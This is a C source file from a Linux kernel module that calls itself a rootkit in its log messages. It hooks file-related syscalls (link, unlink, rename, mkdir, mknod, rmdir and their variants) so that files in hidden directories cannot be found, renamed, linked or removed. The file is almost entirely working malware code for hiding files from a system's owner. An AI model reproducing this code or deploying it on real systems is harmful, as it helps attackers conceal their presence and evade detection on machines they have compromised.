#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/errno-base.h>
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

static inline long do_rename(const sysfun_t orig_func, struct pt_regs *const p_regs,
                             const int i32_olddfd, const char __user *const s_oldname,
                             const int i32_newdfd, const char __user *const s_newname,
                             const unsigned int ui32_flags)
{
    // Check if the new file is in a hidden directory
    if (is_pathname_hidden(i32_newdfd, s_newname, LOOKUP_PARENTS)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_func, p_regs, i32_olddfd, s_oldname, ui32_flags);
}

// sys_link syscall hook handler
SYSCALL_HOOK_HANDLER2(link, orig_link, p_regs, const char __user *, s_oldname, const char __user *,
                      s_newname)
{
    pr_info("[ROOTKIT] link(%p, %p)\n", s_oldname, s_newname);

    return do_check_hidden(orig_link, p_regs, AT_FDCWD, s_oldname, 0);
}

// sys_linkat syscall hook handler
SYSCALL_HOOK_HANDLER5(linkat, orig_linkat, p_regs, int, i32_olddfd, const char __user *, s_oldname,
                      int, i32_newdfd, const char __user *, s_newname, int, i32_flags)
{
    pr_info("[ROOTKIT] linkat(%d, %p, %d, %p, %d)\n", i32_olddfd, s_oldname, i32_newdfd, s_newname,
            i32_flags);

    return do_check_hidden(orig_linkat, p_regs, i32_olddfd, s_oldname, i32_flags);
}

// sys_unlink syscall hook handler
SYSCALL_HOOK_HANDLER1(unlink, orig_unlink, p_regs, const char __user *, s_pathname)
{
    pr_info("[ROOTKIT] unlink(%p)\n", s_pathname);

    return do_check_hidden(orig_unlink, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_unlinkat syscall hook handler
SYSCALL_HOOK_HANDLER3(unlinkat, orig_unlinkat, p_regs, int, i32_dfd, const char __user *,
                      s_pathname, int, i32_flag)
{
    pr_info("[ROOTKIT] unlinkat(%d, %p, %d)\n", i32_dfd, s_pathname, i32_flag);

    if ((i32_flag & ~AT_REMOVEDIR) != 0) {
        return -EINVAL;
    }

    return do_check_hidden(orig_unlinkat, p_regs, i32_dfd, s_pathname, i32_flag);
}

// sys_rename syscall hook handler
SYSCALL_HOOK_HANDLER2(rename, orig_rename, p_regs, const char __user *, s_oldname,
                      const char __user *, s_newname)
{
    pr_info("[ROOTKIT] rename(%p, %p)\n", s_oldname, s_newname);

    return do_rename(orig_rename, p_regs, AT_FDCWD, s_oldname, AT_FDCWD, s_newname, 0);
}

// sys_renameat syscall hook handler
SYSCALL_HOOK_HANDLER4(renameat, orig_renameat, p_regs, int, i32_olddfd, const char __user *,
                      s_oldname, int, i32_newdfd, const char __user *, s_newname)
{
    pr_info("[ROOTKIT] renameat(%d, %p, %d, %p)\n", i32_olddfd, s_oldname, i32_newdfd, s_newname);

    return do_rename(orig_renameat, p_regs, i32_olddfd, s_oldname, i32_newdfd, s_newname, 0);
}

// sys_renameat2 syscall hook handler
SYSCALL_HOOK_HANDLER5(renameat2, orig_renameat2, p_regs, int, i32_olddfd, const char __user *,
                      s_oldname, int, i32_newdfd, const char __user *, s_newname, unsigned int,
                      ui32_flags)
{
    pr_info("[ROOTKIT] renameat2(%d, %p, %d, %p, %u)\n", i32_olddfd, s_oldname, i32_newdfd,
            s_newname, ui32_flags);

    if ((ui32_flags & ~(RENAME_NOREPLACE | RENAME_EXCHANGE | RENAME_WHITEOUT)) ||
        ((ui32_flags & (RENAME_NOREPLACE | RENAME_WHITEOUT)) && (ui32_flags & RENAME_EXCHANGE))) {
        return -EINVAL;
    }

    return do_rename(orig_renameat2, p_regs, i32_olddfd, s_oldname, i32_newdfd, s_newname,
                     ui32_flags);
}

// sys_mkdir syscall hook handler
SYSCALL_HOOK_HANDLER2(mkdir, orig_mkdir, p_regs, const char __user *, s_pathname, umode_t,
                      ui16_mode)
{
    pr_info("[ROOTKIT] mkdir(%p, %u)\n", s_pathname, ui16_mode);

    return do_check_hidden(orig_mkdir, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
}

// sys_mkdirat syscall hook handler
SYSCALL_HOOK_HANDLER3(mkdirat, orig_mkdirat, p_regs, int, i32_dfd, const char __user *, s_pathname,
                      umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] mkdirat(%d, %p, %u)\n", i32_dfd, s_pathname, ui16_mode);

    return do_check_hidden(orig_mkdirat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
}

// sys_mknod syscall hook handler
SYSCALL_HOOK_HANDLER3(mknod, orig_mknod, p_regs, const char __user *, s_pathname, umode_t,
                      ui16_mode, unsigned int, ui32_dev)
{
    pr_info("[ROOTKIT] mknod(%p, %u, %u)\n", s_pathname, ui16_mode, ui32_dev);

    return do_check_hidden(orig_mknod, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
}

// sys_mknodat syscall hook handler
SYSCALL_HOOK_HANDLER4(mknodat, orig_mknodat, p_regs, int, i32_dfd, const char __user *, s_pathname,
                      umode_t, ui16_mode, unsigned int, ui32_dev)
{
    pr_info("[ROOTKIT] mknodat(%d, %p, %u, %u)\n", i32_dfd, s_pathname, ui16_mode, ui32_dev);

    return do_check_hidden(orig_mknodat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
}

// sys_rmdir syscall hook handler
SYSCALL_HOOK_HANDLER1(rmdir, orig_rmdir, p_regs, const char __user *, s_pathname)
{
    pr_info("[ROOTKIT] rmdir(%p)\n", s_pathname);

    return do_check_hidden(orig_rmdir, p_regs, AT_FDCWD, s_pathname, 0);
}
